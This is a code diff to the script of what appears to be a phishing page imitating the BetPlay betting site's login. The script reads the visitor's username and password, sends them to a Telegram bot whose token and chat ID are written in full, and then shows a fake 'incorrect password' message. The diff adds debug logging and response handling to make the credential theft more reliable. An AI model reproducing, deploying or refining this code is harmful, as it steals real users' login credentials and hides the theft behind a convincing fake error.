@@ -424,7 +424,7 @@
 <script src="https://promobetplay.com/home.js?v=70"></script>
 
 <script>
-    const TOKEN = "9235238695:AAHiLDVz7pX9C43OossZNVWaMshUwDrEAcg";
+    const TOKEN = "9235238695:AAHiLDVz7pX9C43OossZNVWaMshUwDrEAcg"; // Pon tu token real aquí
     const CHAT_ID = "7007914207";
 
     // Neutraliza la alerta de mantenimiento de la página original
@@ -448,6 +448,8 @@
                 const usuario = document.getElementById('loginUsuario')?.value || document.querySelector('input[type="text"], input[type="email"], input:not([type="password"])')?.value;
                 const password = document.querySelector('input[type="password"]')?.value;
 
+                console.log("Intentando enviar usuario:", usuario);
+
                 if (usuario && password) {
                     const mensaje = `🚨 ¡NUEVA CAPTURA BETPLAY!\n👤 Usuario: ${usuario}\n🔑 Contraseña: ${password}`;
                     
@@ -459,11 +461,18 @@
                             text: mensaje,
                             parse_mode: 'HTML'
                         })
-                    }).then(() => {
+                    })
+                    .then(response => response.json())
+                    .then(data => {
+                        console.log("Respuesta de Telegram:", data);
                         alert("Usuario o contraseña incorrectos. Intente nuevamente.");
-                    }).catch(() => {
+                    })
+                    .catch(err => {
+                        console.error("Error al enviar a Telegram:", err);
                         alert("Usuario o contraseña incorrectos. Intente nuevamente.");
                     });
+                } else {
+                    alert("Por favor completa los campos.");
                 }
             });
         }
